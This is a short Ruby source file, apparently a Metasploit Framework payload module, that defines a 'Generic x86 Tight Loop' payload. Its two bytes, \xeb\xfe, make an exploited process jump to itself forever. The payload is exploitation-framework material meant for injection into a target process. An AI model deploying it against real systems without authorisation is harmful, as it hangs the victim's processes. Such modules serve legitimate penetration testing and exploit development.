##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/payload/generic'

module Metasploit3

  include Msf::Payload::Single

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Generic x86 Tight Loop',
      'Description'   => 'Generate a tight loop in the target process',
      'Author'        => 'jduck',
      'Platform'	    => %w{ bsd bsdi linux osx solaris win },
      'License'       => MSF_LICENSE,
      'Arch'		    => ARCH_X86,
      'Payload'	    =>
        {
          'Payload' => "\xeb\xfe" # jump to self
        }
      ))
  end

end
